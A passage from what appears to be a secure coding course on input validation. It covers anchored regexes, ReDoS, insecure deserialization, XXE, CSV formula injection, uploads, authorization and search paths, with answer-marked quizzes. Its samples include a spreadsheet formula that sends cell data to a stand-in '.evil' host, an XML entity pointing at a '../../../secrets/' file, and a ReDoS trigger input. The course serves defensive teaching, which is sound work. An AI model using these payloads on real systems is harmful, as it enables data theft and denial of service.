In fact, by default, regexes *search* for the given pattern in a string. That is, normally a regex implementation will see if a pattern matches some text if it starts at the first character, then second character, and so on, reporting if it can find *any* match. So the pattern “**ca[brt]**” will also match “**abdicate**” because there is a “**cat**” in the word “**abdicate**”.

Regular expressions can do much more, though. If you follow a pattern with “**&#42;**”, that means “*0 or more times*”. So the regex pattern “**a&#42;b&#42;x**” describes a pattern of 0 or more **a**’s, followed by 0 or more **b**’s, followed by **x**. This pattern matches strings like “**aabx**”, “**bbbx**”, and “**abx**”, but not “**aabb**”. Most regex implementations also support “**+**” for “*1 or more times*” and “**?**” for “*0 or 1 times*”. Most regex implementations also let you use parentheses to group expressions, for example, “**f(abc)&#42;d**” matches if there is an “**f**”, followed by 0 or more instances of the sequence “**abc**”, followed by the letter “**d**”.

You can usually do a case-insensitive match through some option. Make sure you set the locale if you use case-insensitive matching, since different languages have different rules, and sometimes the rules can be complex. For example, in German the lowercase “sharp-s” character “**ß**” is equivalent to the uppercase “**SS**” when using a case-insensitive match. In some cases, you may only want to do “*ASCII case-insensitive matching*”; this compares a sequence of code points as if all ASCII code points in the range 0x41 to 0x5A (A to Z) were mapped to the corresponding code points in the range 0x61 to 0x7A (a to z).

There is far more to regexes. In fact, there is a whole book on just regular expressions, [*Mastering Regular Expressions, 3rd Edition*](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/), by Jeffrey Friedl (2006), and there are many tutorials on regexes such as the  [Regular Expressions for Regular Folk](https://refrf.shreyasminocha.me/) tutorial by Shreyas Minocha. But that introduction will get us started, because we are now going to discuss how regexes can be used for input validation.

### Using Regular Expressions for Text Input Validation

Many programs need to quickly validate input text from untrusted sources. While there are many ways to do that, regexes are often an especially useful tool for input validation of text. Regexes are generally quick to write down (so they take very little development time), easy to use, and widely available. They’re also flexible enough for many input validation tasks, compact, and normally execute very quickly. They are also widely known and understood. These are important advantages; if writing input validation is too hard, it won’t be done. They don’t solve all possible input validation problems, but they are useful enough that they are important to know.

Regular expressions were originally used in software for *searching* for text patterns, not for validating text inputs against a pattern. Regexes are also good at text input validation, but there are a few things you need to know so you can use regexes correctly for text input validation.

#### Match, Don’t Search

A key issue with regexes is that by default most regex implementations *search* to see if a given pattern can be found anywhere within some text. When we are doing input validation we don’t want to search; we want to know if all the text input *exactly matches* a pattern. That means we need to be able to ask the regex implementation *“does this input text exactly match this pattern”* - and reject the input if it doesn’t match. As with any other input validation, we need to make our pattern as limiting as possible, and if the input doesn’t match, then reject the input.

The usual way to require a regex to match an entire input is to include *anchors* in the regex. Just start your regex pattern with a *start anchor* - usually represented by “**^**” or sometimes “**\A**” - and end the pattern with “**$**” or sometimes “**\z**”. With these, the entire input must match the pattern. For example, this regex will match *any* text that contains “**cab**”, “**car**”, or “**cat**” - it will even match “**abdicate**” - so you should *not* use a regex like this for input validation:

**ca[brt]**

In contrast, this regex will only match *exactly* the words “**cab**”, “**car**”, or “**cat**” in most regex implementations, because “**^**” means *“match the beginning”* and “**$**” means *“match the end”*:

**^ca[brt]$**

In some implementations (depending on the option), “**^**” may mean *“beginning of any line”* not *“beginning of the string”* - and you usually want *“beginning of the string”*. A similar thing can happen with “**$**”. From here on we will assume that “**^**” and “**$**” mean beginning and end of the entire string.

#### Know Your Regex Implementation

Almost every programming language has at least one good regex implementation. They all share many features, but many are slightly different. So, when you use a regex implementation you have not used before, look at its documentation every time you use an operation that you have not used before. Here are some variations to look for.

There are three major families of regex language notations:

1. Basic regular expression (BRE)<br>This is the default for **grep** and **sed**. This is defined by the POSIX standard. However, its syntax is sometimes a little awkward, so in most cases, it is easier to use extended regular expressions instead for input validation.

2. Extended regular expression (ERE)<br>This is defined by the POSIX standard and adds capabilities like using parentheses for grouping and “**+**” for *“one or more”*. This is often used in C programs. So for example, “**[B-D]+**” means *“one or more of the letters B, C, or D”*.

3. Perl Compatible Regular Expressions (PCRE)<br>This is mostly an extension of the ERE format; many other programming languages use this family of regex languages. It includes capabilities like “**\d**” to represent digits.

 Here are some important things that vary:

* Sometimes there is an option or alternative method to match the entire input; if available, you can use that instead of the anchoring symbols. Make sure it matches the whole thing, though; some methods only check the beginning.

* Sometimes “**^**” matches the beginning of the whole data, while in others it represents the beginning of any line in the data. The same goes for “**$**”. This is often controlled by a *multiline* option.

* The “**.**” for representing *“any character”* doesn’t always match the newline character (**\n**); often there is an option to turn this on or off.

* Does it properly support Unicode and the encoding you are using?

* Can it handle data with the **NUL** character (byte value 0) within the data? If not, and your input data could have an embedded **NUL** character, you will need to validate the data first to make sure there are no **NUL** characters before passing the data to the regex implementation.

* Is matching case-sensitive? Usually it is case-sensitive by default, and there is a trivial way to make it case-insensitive. If it is case-insensitive, remember that exactly what characters have case-insensitive matches depends on the locale. For example, “**I**” and “**i**” match in the English (“**en**”) and the C locale (“**C**”), but not in the Turkish (“**tr**”). In the Turkish locale, the Unicode LATIN CAPITAL LETTER I matches the LATIN SMALL LETTER DOTLESS I - not a lowercase “**i**”.

In some languages, such as in Ruby, you normally use **\A** and **\z** instead of “**^**” and “**$**” to match string begin/end, because “**^**” and “**$**” match line begin/end instead.

#### Branch Priority

Almost all regex implementations support *branches* - that is, “**aa|bb|cc**” matches **aa**, **bb**, or **cc**. All ERE and PCRE implementations support branches, and even some BRE implementations support branches if they are written as “**&#92;|**” instead of “**|**”. The *priority* of the branch operation is standard, but it is not what some users expect. The regex “**^aa|bb$**” means *“either it begins with aa OR it ends with bb”*, not *“exactly aa or bb”*.  When you are using regexes for input validation, a sequence of branches that is not surrounded by parentheses is practically always a mistake. What you normally want is “**^(aa|bb)$**” which means *“exactly aa or bb”*.

**🚩 So, whenever you have a branch (“|”) in a regex, group the whole expression with branches using parentheses.**

#### Test Input Validators

Again, you should know what your software should not accept, and use some of those examples as automated test cases to ensure that your software will correctly reject them. This is especially important with regexes, because it is easy to write a regex that looks fine but allows inputs it wasn’t intended to. This can help you catch, for example, missing anchors or failures to surround branches with parentheses.

#### Quiz 1.4: Using Regular Expressions for Text Input Validation

\>\>Which of the following matches only “1 or more lowercase Latin letters” using an extended regular expression (given the POSIX locale)?<<

(!) **[a-z]&#42;**

( ) **[a-z]+**

( ) **^[a-z]&#42;$**

(x) **^[a-z]+$**

[Explanation]

Remember, **^...$** are required to make this an allowlist (the text *must* match the pattern), and “**+**” means *“one or more”*.

[Explanation]

### Countering ReDoS Attacks on Regular Expressions

When you add code, there is a risk that the added code has a vulnerability. This is especially true when you add code that is supposed to help keep your software secure, since by definition, problems in that code could lead to a security problem.

If you add input validation checks using regular expressions - a common and helpful approach - there is a kind of vulnerability you can unintentionally add called a *Regular expression Denial of Service (ReDoS)* vulnerability. If your software has a ReDoS vulnerability, attackers can force situations where the regular expression can be run for an extremely long time (possibly days or years). The result is a denial of service (DoS) - the attack may be able to send a small amount of data and cause the service to be unavailable! This is not theoretical. In 2020, the **websocket-extensions npm** package and its Ruby version were found to both have this flaw (these were given identifiers [CVE-2020-7662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7662) and [CVE-2020-7663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7663) respectively).

The reason that the ReDoS vulnerability is possible is that most regex implementations have a worst case complexity that grows exponentially based on the size of the input. A little background may help here. There are two main approaches to implementing regexes: a *deterministic finite automaton* (DFA) or *nondeterministic finite automaton* (NFA). DFAs are fast, in part because they never backtrack, and DFAs are immune to ReDoS vulnerabilities. But DFAs are also limited in what they can do. In practice, most regex implementations today are NFAs, and NFAs *are* potentially vulnerable to ReDoS attacks.

NFA implementations of regexes - and that is most of them - *backtrack* whenever they fail a specific match until they either find a match or have tried all possibilities. In short, in the worst case they try *all* combinations. For many regular expression patterns this worst case is not a problem. However, certain kinds of regex patterns can make this worst case really bad. In particular, let’s imagine that we provide a pattern where:

1. The regex pattern uses repetition on complex subexpressions (the use of “**+**” and “**&#42;**” on complex subexpressions), and

2. Within these repeated subexpressions, there are additional repetition symbols and expressions that match a suffix of another match. ([OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS))

A trivial example is the regex pattern “**^(a+)+$**”. Let’s imagine that an attacker provided the input value ”**aaaaX**”. An NFA will match the input first letter “**a**” with the “a” in the pattern easily, but then the regex implementation has two options: should it try to apply the *inner* “**+**” or the *outer* “**+**” to the next letter? Most implementations would try the inner one first, and then backtrack as needed. In the worst case, an NFA has to try out *all* possible combinations. Thus, to determine if the input “**aaaaX**” matches the pattern, an NFA regex has to try out 16 possible paths (all possibilities), with each one eventually failing because of the trailing “**X**”. If the attacker provides the input “**aaaaaaaaaaaaaaaaX**” there would be 65536 possible paths, with the number of paths doubling for each additional “**a**”. If an attacker provided 80 ‘**a**’s followed by **X**, that thread will try to process all combinations, which would take so long that it would become a denial-of-service.

We use the term *vulnerable regexes* for regex patterns with this awful worst-case behavior. A common industry term for these patterns is *evil regexes*. It is not that the regex is provided by an attacker necessarily, it is just that their worst-case behavior is “evil” and this makes them vulnerable to attack. Another term for this behavior is *catastrophic backtracking*.

There are many solutions to this problem, including the following:

1. Use a regex implementation that uses a DFA. DFA-based implementations are not vulnerable to this problem. For example, in the NPM ecosystem, “**re2**” implements a DFA regex engine. However, DFA-based regex engines are generally less capable and in many environments are much more trouble to install and use, so this is rarely done.

2. Modify the regex so that it doesn’t have this worst-case behavior. This is the usual approach. Be especially wary of any group “**(...)**” that contains a branch and/or ends with a repeat and is itself repeated.

    1. If there is a repeat or branch in a regex that is itself repeated, rewrite the regex so the next character in the input would unambiguously determine if the repeat continues or not. E.g., rewrite “**^(a+)+$**” as “**^a+$**”.

    2. Another approach is to use mechanisms that tell the regex engine not to backtrack; many regex implementations have *possessive quantifiers* and/or *atomic grouping* which can prevent unnecessary backtracking.

    3. Avoid unbounded repetition. For example, define maximum repetition counts (e.g., **{0,5}**) so the worst-case behavior is greatly limited.

    Some tools examine source code to detect regexes with worst-case behaviors (these may be standalone tools or part of bigger tools).

3. Where you can, limit the maximum length of input strings and check the input length first. If inputs must be short, the exponential growth in time will still end up as a small total amount of time.

4. Implement a timeout, on the regex (if supported) or on the application as a whole. For example, [Ruby 3.2](https://www.ruby-lang.org/en/news/2022/04/03/ruby-3-2-0-preview1-released/) supports a global regex timeout value (`Regexp.timeout`) and a timeout parameter when instantiating a regular expression object. The [.NET framework MatchTimeout mechanisms](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.matchtimeout) can also set a global timeout value or one for each regex.

5. Don’t run regexes provided by attackers on systems other than their own. It is okay for an adversary to provide a regex that they themselves always run (in that case, attackers just attack themselves). But if attackers can provide regexes that you run, they may be able to cause a ReDOS (unless you have taken other steps to prevent it). Regexes are, in general, programming languages, and you should generally avoid running attacker-provided programs. It is possible to do it relatively securely, but you need to take a lot of precautions and it is always more secure to just not do it.

If you are interested in more details, see the [OWASP discussion](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS) about this.

Note: ReDoS is often *not* a real vulnerability. Such regexes can *only* be a vulnerability if they run on a trusted system and process untrusted input. There are many tools that can detect regexes that are vulnerable to ReDoS but don't determine if the input sources are untrusted. Such tools can flood developers with so-called "vulnerabilities" that aren't really vulnerabilities. In addition, in some cases countermeasures (like maximum input sizes and timeouts) effectively eliminate ReDoS effectiveness. Even when a regex processes untrusted inputs and these countermeasures fail, ReDoS at *most* will cause a denial of service, not a loss of confidentiality or integrity. Thus, while ReDoS can be a real vulnerability, it's often not a vulnerability or is less important. If you find yourself dealing with a large number of ReDoS vulnerability reports, recheck to see if these are real vulnerabilities.
(See [Enosuchblog's "ReDoS "vulnerabilities" and misaligned incentives"](https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives).)

#### Quiz 1.5: Countering ReDoS Attacks on Regular Expressions

\>\>Which of these are *practical* ways to mitigate ReDoS attacks? Select all answers that apply.<<

[!x] Use a regular expression engine that does not use backtracking (that is, a DFA).

[x] Where possible, write regexes that don’t have this worst-case behavior. For example, be cautious about repetitions inside repetitions.

[x] Limit the maximum size of the input, so that even the worst-case behavior is not so bad.

[ ] None of the above

## Input Validation: Beyond Numbers and Text

### Insecure Deserialization

Don’t just blindly accept more complex data formats. Instead, ensure that accepting that input from an untrusted source will not cause a security problem.

A dangerous problem is insecure deserialization. **Deserialization** is the process of converting some sequence (of bytes or characters) into some internal format; that process may create a number of objects. Deserialization can happen when reading data from a network or from storage, because in both cases there is a need to turn a sequence of bytes or characters into an internal format. Unfortunately, deserialization can result in serious problems, because if the source is untrusted, then the attacker may provide a manipulated sequence:

1. The data might be converted into an unexpected value that you should not trust. For example, it might be a structured cookie value that originally said **admin=n**, but the attacker may change the value to **admin=y**. If the program blindly accepted this data, the attacker might suddenly become an administrator!

2. Deserializing the data might cause code execution, e.g., it might create classes or instances and/or call attacker-selected methods with attacker-provided arguments. This is especially a problem for formats designed for arbitrary object persistence. An example of this is the Python pickle format, which automatically executes code in certain cases when deserializing data.

**🚩 The safest solution is to not accept serialized objects from untrusted sources.**

If you must accept serialized objects from untrusted sources, you can use serialization formats that do not support code execution. For example, use serialization formats that only allow primitive data types. This counters the second problem - code execution - but by itself, it does not solve the first problem - unexpected values. So, if after choosing an approach to prevent code execution, validate the input you have received using the approaches we have already discussed.

In some cases, you can prevent deserialization attacks with authentication checks. Basically, turn untrusted data into trusted data! To do this, before you deserialize the data, run an authentication check to ensure that the data is from a trusted source. A common way to do this is by checking a digital signature, message authentication code (MAC), authenticated encryption, or similar measure. This approach is especially common in web applications; often, a web server will send data to a client, so that the client can later send it back (e.g., as a cookie). This approach is fine as long as the web server verifies its integrity (to prevent attacker creation or tampering) *before* it is deserialized.

Some people recommend enforcing string type constraints (e.g., only allowing specific classes to be deserialized). Unfortunately, many bypasses to this technique have been found over the years. It is a good idea as a *hardening* technique (or simply as a way to detect bugs early). However, in many systems, this is probably too dangerous to recommend as an adequate defense by itself.

🔔 Insecure deserialization is such a common mistake in web applications that it is 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, and 2019 CWE Top 25 #23. It is [CWE-502](https://cwe.mitre.org/data/definitions/502.html), *Deserialization of Untrusted Data*. It is also considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Attackers may find such vulnerabilities harder to exploit, but once the vulnerability is found it can result in immediate compromise of an entire system, because it may provide complete control of the system to the attacker.

#### Quiz 1.6: Insecure Deserialization

\>\>One of the big risks in deserializing data is that, depending on the serialization format, the data might cause attacker-defined code to be executed. True or False?<<

(x) True

( ) False

### Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)

Of course, sometimes a program needs to accept common complex data structures, such as XML, HTML, JSON, and CSV. Since these are common formats, it is worth talking about them specifically.

While technically these are strings, in reality these are strings with their own more complex internal structure. It is often best to use libraries specifically designed to handle these input formats, as long as they are designed to handle potentially-malicious inputs. You should typically try to identify and reject data structures that are not syntactically valid, and then, where appropriate, check that they meet whatever specific schema they are supposed to meet. Ideally, these libraries will let you specify only what you want to accept, and reject everything else. If those mechanisms cannot fully validate the input, then supplement that with whatever input validation you need to ensure that only valid data is accepted.

#### XML

Lots of data and messages are encoded in XML (Extensible Markup Language). XML is part of other formats, such as SOAP (Simple Object Access Protocol). There are two terms about XML that are widely confused:

* **Well-formed**<br>Well-formed XML follows certain syntax rules. For example, all opened tags must be closed, and XML elements must be properly nested. If you are accepting XML, at *least* verify that the XML is well-formed; there are easily-available libraries for this, and applications are only supposed to accept XML that is well-formed.

* **Valid**<br>Valid XML meets some schema definition. The schema specifies information such as *what* tags are allowed, how they may be nested, and whether some are required. A schema definition, if rigorous, is a kind of allowlist. Thus, checking for validity before accepting XML input can be really useful for countering attacks. However, do *not* allow the attacker to determine what schema to use - decide what schema is okay and use *that*. Sometimes no schema is available, and if you are only extracting a small part of XML, it may not be worth it to create an XML schema.

If you are using XML, there is an extremely common vulnerability you need to counter called XML External Entities (XXE). To understand them, you need to understand some XML functionality that is not widely known.

XML supports external references which can be auto-loaded when the original document is loaded. The external reference can be any file location or URL. This means an attacker can provide files that quietly cause other files or URLs to be loaded and placed in certain places. This functionality exists for a reason, and some systems legitimately depend on it. However, many developers have no idea that this is possible, and this has led to many vulnerabilities. Here is an example of an XML document with embedded external entities:

~~~~xml
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

    <!DOCTYPE letter [

      <!ENTITY part1 SYSTEM "http://www.example.com/part1.xml">

      <!ENTITY part2 SYSTEM "../../../secrets/part2.xml"> ]> ...

    <building>

    &part1; &part2;

    </building>
~~~~

In general, you should not accept unchecked external references from untrusted sources. Here are a few possible solutions:

* Configure your XML reader/processor to ignore or reject external references. Make sure to check, in your automated tests, that it is still being ignored! Since most applications don’t use external entities, this is typically the easiest solution.

* Forbid or check (with an allowlist) any external reference before use.

* Don’t use XML, including formats like SOAP that use XML. Other formats, like JSON, don’t have this mechanism and thus cannot have this problem.

For more about this issue, see the [OWASP XML External Entities web page](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html).

🔔 XML XXE is such a common mistake in web applications that it is 2017 OWASP Top 10 #4, 2021 CWE Top 25 #23, and 2019 CWE Top 25 #17. It is also identified as [CWE-611](https://cwe.mitre.org/data/definitions/611.html), *Improper Restriction of XML External Entity Reference*.

#### HTML

Typically you can simply call a library to validate HTML and pass a set of allowed tags (e.g,. **&lt;p&gt;**) and attributes (e.g., **href=**). Everything not permitted is removed or rejected. This will eliminate dangerous tags like **&lt;script&gt;** from external sources (presuming that you don’t include dangerous tags in the set of allowed tags).

Although this is potentially a big topic, in practice, the key is often to use a library with decent secure defaults. If you only allow tags such as **&lt;p&gt;**, **&lt;i&gt;**, and **&lt;b&gt;**, and limit attributes to values such as **id**, the amount of damage that can be done is greatly limited.

#### CSV

The “comma separated value” (CSV) format is in theory simple. Every line is a record, where fields are separated by commas. The first line is usually a “header line” - the field names separated by commas (you should always provide the header, since this makes the CSV file more extensible and much easier to handle with other tools).

In practice, there is a lot of variation in CSV formats. However, for security, the *bigger* problem is that some tools (such as Microsoft Excel and LibreOffice) will *execute* certain constructs when they read CSV, even if CSV looks like a data-only format. For example, a field value beginning with “**=**” is interpreted as “*execute these functions*”, and functions can access external data. In some spreadsheet implementations, the field contents “**=IMPORTXML(CONCAT(“"<http://some-server-with-log.evil?v>="”, CONCATENATE(A2:E2)), “"//a"”)**” will *send* data from the spreadsheet to an external site. The solution, as always, is to validate each field value before accepting it. Especially problematic values are those beginning with **=**, **+**, **-**, and **@**.

When reading these formats from an untrusted source, ensure that each cell meets the expected data format, and don’t pass on the data otherwise. Be especially wary of cells beginning with “**=**”, and try to avoid passing them on, since some tools may execute their contents.

#### JSON

JSON does not have the built-in capability to record external entities or expressions that many tools would expect to be executed, which makes it an advantage from a security point-of-view. There are tools that can easily validate JSON syntax, often implemented as part of reading JSON into a useful internal format.

If you want to go further, there are formats such as JSON Schema that let you define with more rigor exactly the format of a given JSON format. Then you can use JSON Schema validators to verify that the data matches the schema.

#### File uploads

Sometimes you need to accept file uploads of special file types (e.g., of images).

If your program allows uploads, try to limit uploads to specific file types and make sure (via both its MIME type and its contents) that it is one of the valid types that you will accept. Limit what you allow in the filename, too; alphanumeric characters are generally fine, but anything else (especially “**/**” and “**&#92;**”) can be problematic, so only allow the characters you are certain will be fine. Where possible, define an acceptlist of allowed filename suffixes, and only allow uploads of files named with one of those allowed suffixes.

🔔 Inadequate restriction of uploads is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #10 and 2019 CWE Top 25 #16. It is identified as [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *Unrestricted Upload of File with Dangerous Type*.

#### Quiz 1.7: Input Data Structures (XML, HTML, CSV, JSON, & File Uploads)

\>\>When reading data in common data formats like XML and JSON, prefer to use libraries designed to securely handle them, try to reject structures that are not syntactically valid, and then where practical, check that they meet whatever specific schema you require. True or False?<<

(x) True

( ) False

### Minimizing Attack Surface, Identification, Authentication, and Authorization

In the Design chapter (in Part I of this course), we noted that it is important to minimize the *attack surface* - that is, the interfaces the attacker can get access to. This does not mean “limit the interfaces that you *intend* for users to use"; your *implementation* must limit the interfaces an attacker has access to. Try to make it so attackers cannot even *access* most interfaces, then carefully protect the interfaces that are accessible.

That said, in many systems, attackers will be able to attempt some requests. In those cases, you will need to make sure that the request is authorized (allowed) before it is honored. Remember, authorization means determining whether or not that request is allowed to that person or program.

You need to *check* whether or not a request is *authorized* in *absolutely every case* if it might not be. That is to say, ensure that authorization checks are non-bypassable. Tools are often not good at determining if every request is checked for authorization, so you typically need to depend primarily on human review. If humans can easily see that the correct authorization check is made for every request, it takes much less time to review *and* it is more likely to be correct. In practice, that often means that programs should check for authorization as soon as you reasonably can do so. Exactly what that means depends on your system, e.g., in a model-view-controller architecture, you could put authorization checks on each controller entry and/or each model entry. What matters is that you do it consistently and that it is easy for others to verify that it cannot be bypassed. Similarly, the data needs to be stored so that only authorized requests can succeed.

🔔 Inadequate authorization is such a common mistake that *Broken Access Control* is 2017 OWASP Top 10 #5 and 2021 OWASP Top 10 #1. *Incorrect Authorization* is 2021 CWE Top 25 #38 and 2019 CWE Top 25 #33 ([CWE-863](https://cwe.mitre.org/data/definitions/863.html)), and *Missing Authorization* is 2021 CWE Top 25 #18 and 2019 CWE Top 25 #34 ([CWE-862](https://cwe.mitre.org/data/definitions/862.html)).

Of course, if something requires authorization, that means there should first have been some kind of identification and authentication (I&amp;A) to ensure that the request was from whom they claimed to be. Thoroughly check how you handle authentication, and where practical, use well-respected services, libraries, or frameworks to do it.

You should typically first do input validation of an identity (such as a username or email address), before doing anything else with it, to reduce the likelihood of an attacker subverting a system through its login system. In most cases you should only report “login failed” (or similar) if the combination of the identity and the authentication (such as a password) failed; don’t reveal if the identity exists in the system, since that lets the attacker know if the identity is present on the system. You should support multi-factor authentication (MFA) logins, either directly or via a service, since these tend to be stronger than passwords.

If you do support passwords for authentication, follow good practices, e.g.:

1. Make sure that no more than 1 character of a password is displayed to a user at a time, to reduce the risk of someone else being able to see the password (aka “shoulder surfing”). You can do this in HTML input fields by using the input type `password`.
2. Ensure that users can use password managers when logging in, creating a password, or changing a password. For example, ensure that users can copy text into the password fields, as this functionality is necessary for some password managers. Forcing users to manually type passwords encourages them to use poor passwords and discourages them from using a password manager (which is considered best practice by many).
3. When creating or changing a password, ask the user to enter the old password. This prevents an attacker from easily changing the password if they have brief control of the account. Also, ask the user to enter a new password twice and verify that they are the same, to ensure that the intended password will be used as the password. This also verifies that a password manager (if any) is sending the password consistently.

When a user changes a password or other credential (like MFA tokens), consider notifying the user (such as by sending an email or text message). That way, if the user didn’t cause the change, the user will be immediately alerted.

🔔 2021 OWASP Top 10 #7 is *Identification and Authentication Failures*. Inadequate authentication is such a common mistake that *Broken Authentication* is 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, and 2019 CWE Top 25 #13. It is [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *Improper Authentication*. *Missing Authentication for (specifically a) Critical Function* is 2021 CWE Top 25 #11 and 2019 CWE Top 25 #36 ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)).

We will later discuss various tools for verification. While tools can help find some problems, they are often *less* effective at finding authentication and authorization problems, because the tools don’t usually have enough information to determine *what is acceptable* and *what is not*. It helps to have tests that verify unauthorized requests are rejected, of course. But the most effective approach is ensuring that absolutely every input path is quickly authenticated and authorized where appropriate, so that manual review can easily assure reviewers that all cases are covered.

> 😱 STORY TIME: Target Breach

> In 2013 the Target Corporation’s network was breached. In this incident 40 million credit and debit card numbers and 70 million records of personal information were stolen. The full costs are difficult to estimate, but the credit card unions spent over $200 million just to reissue cards. The best available evidence suggests that the initial breach occurred in a third party heating, ventilation, and air-conditioning (HVAC) firm. The attackers used these compromised credentials to penetrate the Target network. The attackers were able to subvert sensitive systems due to the weak segmentation between non-sensitive and sensitive networks inside Target ([*Breaking the Target: An Analysis of Target Data Breach and Lessons Learned*](https://arxiv.org/pdf/1701.04940.pdf), by Xiaokui Shu, Andrew Ciambrone and Danfeng Yao, 2017).

#### Quiz 1.8: Minimizing Attack Surface, Identification, Authentication, and Authorization

\>\>It is important that humans be able to directly verify that authentication is non-bypassable. True or False?<<

(x) True

( ) False

### Search Paths and Environment Variables (including setuid/setgid Programs)

Applications often need to search for other resources, such as libraries, commands, and packages. In many cases this search is controlled by a “search path” - a location or sequence of locations to search. One example of a search path is the `PATH` environment variable, which lists a sequence of directories and is used when searching for executables on Unix-like and Windows systems. Many other `PATH`-like environment variables exist (e.g., `PYTHONPATH` in Python). In addition, many other systems have search paths, e.g., package managers typically support a search path that indicates the repositories or registries where packages can be retrieved from.

If an attacker can control the search path, the attacker can often cause the application to run malicious code, use attacker-controlled data, or reveal private data. For example, if an attacker can control the `PATH` environment variable, an attacker may be able to force the application to run unintended programs. The best solution is to ensure the attacker can’t control the search path, e.g., by not providing the opportunity or by setting the search path to a safe value before using it.

A related problem is that the search path may contain a location that an attacker can control or influence in an unanticipated way. For example, if the `PATH` environment variable has an entry set to the current directory, that is, “.” or “” (blank), and the entry is listed before more trustworthy directories, then the current directory would be used first. This can become a vulnerability since the attacker may be able to eventually insert contents into a directory that the application will use as a current directory. On old Unix-like systems this insecure PATH setting was the default. One common way this mistake happens today is if the path is modified by concatenating the directory separator and then the new directory; if the path was empty to start with, doing this adds a blank entry as the first entry. For example, if `PYTHONPATH` was empty, naively concatenating “:” and directory `/usr/share/foo` would produce the `PYTHONPATH` “<tt>:/usr/share/foo</tt>”; notice that the empty directory is listed first, which would be interpreted as first searching the current directory. The solution in this case is to only insert the separator if there is already text there.

There are several potential countermeasures for search path problems, for example:

* On startup, examine a search path you’ll use (like `PATH`) for common errors such as including a blank directory or “.” before more trusted paths (like `/usr/bin`). On Windows systems, check if safe DLL search mode is enabled. You might halt, or at least warn, if the current system settings are dangerous.
* Use full path names when making a request (e.g., calling executable programs, importing libraries, or requesting packages). Most systems that support a search path also support directly requesting the specific component; making a direct request will ensure that you are requesting the right ones. This is a plausible hardening mechanism, but it is easy to forget doing this in some cases, and this does sometimes make it harder to port software between systems.

Many configuration values, including many search paths, are provided via environment variables. Some execution environments, like client-side JavaScript, don’t have environment variables. In most other environments (client and server), environment variables exist, but are typically considered trusted (that is, environment variables can only be set by someone with authorization to set them). However, there are some special cases where their trust should be limited.

Some historical operating systems had insecure settings of environment variables. One of the most common cases is that old operating systems had an unsafe PATH environment variable so the current directory “.” was searched for executables before more trustworthy directories. Similarly, some naive users set their PATH variable to insecure values, though thankfully this kind of mistake is less common today. It’s also very environment-specific; in many environments an attacker won’t be able to control the contents of any of the locations.

However, there’s another important special case: if you are writing something called a **setuid** or **setgid** program, then *environment variables can come from an attacker*. A little introduction is probably in order. Unix-like systems (including Linux and MacOS) allow programs to be **setuid** and/or **setgid**. When a **setuid** program runs, it has the privileges of its *owner* (not its requestor). A **setgid** program runs with the privileges of its *group* (not the groups of its requestor). These kinds of programs inherit many inputs from a potential attacker, including the current directory value and environment variables. One solution is to not write a **setuid** or **setgid** program, as in many cases that approach is not needed today.

If you *do* write a **setuid**/**setgid** program, your program must protect itself from all its inputs, and that includes the current directory and environment variables. Environment variables can be especially tricky, as there are many unsafe approaches that appear safe. That’s because environment variables are typically from trusted sources, so most developers aren’t prepared to deal with the unusual case where the environment variables are *not* from trusted sources. The only safe solution is to (as part of startup) extract *only* the environment variables that are needed, ensure their values are safe, erase *all* environment variables, and reset the variables needed to safe values (including safe values provided on program startup). Erasing all environment variables in most programming languages is easy, simply set the global variable **environ** to a null pointer or its equivalent ([the **environ** variable is defined in the POSIX standard](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html)). Do this *early*, before creating any threads. You cannot simply remove a few environment variables; an attacker may create a bizarre environment variable data structure, and there are simply too many potentially-dangerous environment variables (such as **LD_LIBRARY_PATH**) to try to erase only certain dangerous values. This is yet another example of allowlisting instead of denylisting; only allow the few environment variables you need, with their allowed values, and nothing else. Instead, ensure that the only possible variables are ones you expect and have safe values for. This includes **PATH** and all other environment variables.

🔔 Untrusted search path is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #22. It is [CWE-426](https://cwe.mitre.org/data/definitions/426.html), *Untrusted Search Path*. 2021 CWE Top 25 #34 covers the related *Uncontrolled Search Path Element* ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)).


#### Quiz 1.9: Search Paths and Environment Variables (including setuid/setgid Programs)

\>\>If your software has to run where environment variables are not from trusted sources, you should extract only the variables needed, erase all the environment variables, and then set the environment variables to safe values (including safe values provided as input). True or False?<<

(x) True

( ) False

### Special Inputs: Secure Defaults and Secure Startup

There is a special set of inputs that are often used when starting up: configuration information. This can be critical for security.

Modern systems have many components in them. The software that you develop will probably be a small part of some other much larger system. Don’t expect people to carefully read your documentation; they won’t. Instead, make it *easy* to use your software securely.

First, make sure that your software is *secure by default*. If there is no configuration information, your program should do whatever is the secure thing (which is usually to deny access). If there are sample configurations or sample code showing how to use it, make sure the examples are secure also (people normally copy and paste examples when using something). Don’t create sample configurations that *allow access to all* unless that really is a normal use. Instead, create samples as restrictive as you can reasonably make them. Include many clear comments in the sample configuration file, if there is one, so the administrator understands what the configuration does.

If secure examples are too complicated or hard to explain, that suggests that your configuration or API is too complex or has the wrong defaults. Don’t just fix the documentation, fix the code so it is easier to configure or use securely, and then the documentation will be easier to create.

